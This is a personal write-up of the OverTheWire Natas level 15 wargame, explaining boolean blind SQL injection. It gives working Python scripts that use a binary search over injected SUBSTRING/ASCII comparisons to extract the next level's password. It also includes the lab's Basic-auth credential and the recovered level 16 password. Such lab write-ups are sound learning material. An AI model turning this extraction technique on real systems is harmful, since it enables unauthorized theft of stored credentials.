This level focuses on blind SQL injection where there database doesn't return the result back but response like Yes/No, True/False, 1/0, etc.

In this case, if the user exists, we get a response `This user exists`. If not, we get `This user doesn't exist`.

So to get around our head:
`True`:`This user exists`
`False`:`This user doesn't exist`

Let's use substring to test out the username. We will test out `natas16` as the username to see if it exists with `substring()` - yes, it exists, but just want to get around what `substring()` does.

Syntax: 
```sql
SUBSTRING(string, start, length)
```
![[Pasted image 20260702162551.png]]

Let's brute force the password. the password length is 32 letters long as we know from the previous level and contains chars from a-z, A-Z, 0-9.

The basic script that returns true if `This user exists` exists in the response:
```python
import requests

payload = {"username":"natas16"}
url = "http://natas15.natas.labs.overthewire.org/index.php?debug"
headers = {
    "Authorization":"Basic bmF0YXMxNTpHQjZVU0NKWUpqd0x5WWhaVU5rRTFOd0R1ZWlUb3c2Zw==",
    "Content-Type":"application/x-www-form-urlencoded"
    }

response = requests.post(url, headers=headers,data=payload)

if "This user exists" in response.text:
    print("True")
```

The final version of the script that combines binary search with httpx:
```python
import httpx
import string

chars = string.digits + string.ascii_uppercase + string.ascii_lowercase
PASS_LENGTH = 32
password = ""

url = "http://natas15.natas.labs.overthewire.org/index.php?debug"
headers = {
    "Authorization":"Basic bmF0YXMxNTpHQjZVU0NKWUpqd0x5WWhaVU5rRTFOd0R1ZWlUb3c2Zw==",
    "Content-Type":"application/x-www-form-urlencoded"
    }

for position in range(1, PASS_LENGTH+1):
    low = 0
    high = len(chars)-1
    try:
        while low < high:
            mid = (low + high) // 2
            payload = {"username":f"natas16\" AND ASCII(SUBSTRING(password,{position},1))>ASCII(\"{chars[mid]}\") AND \"1\"=\"1"}
            response = httpx.post(url, headers=headers, data=payload)

            if "This user exists" in response.text:
                low = mid + 1
            else:
                high = mid

        password += chars[low]
        print(f"password:{password}")
    except KeyboardInterrupt:
        print("Stopped")
        break

print(f"Done!\nThe password is:{password}")
```
![[Pasted image 20260702210119.png]]
lvl16 pass: Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb